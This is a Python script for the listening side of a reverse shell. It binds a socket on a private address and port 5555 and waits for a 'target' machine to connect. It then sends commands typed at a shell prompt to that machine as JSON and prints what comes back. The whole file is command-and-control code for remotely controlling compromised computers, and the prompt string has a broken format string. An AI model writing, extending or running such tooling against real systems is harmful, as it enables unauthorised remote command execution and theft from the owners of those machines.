#!/usr/bin/python3

import socket
import json

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recieve():
    data = ''
    while True:
        try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
        except ValueError:
            continue

def target_communication():
    while True:
            command =input('* shell~%s: %str(ip)')
            reliable_send(command)# will send command to device
            if command == 'quit':
                break #this will exit out the program once you use quit.
            else:
                result = reliable_recieve() #if it wasn't we  will use this line as a function to recive this response
                print(result) #print result

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.0.1.67',5555))
print('[+] Listening for incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' +  str(ip))
target_communication()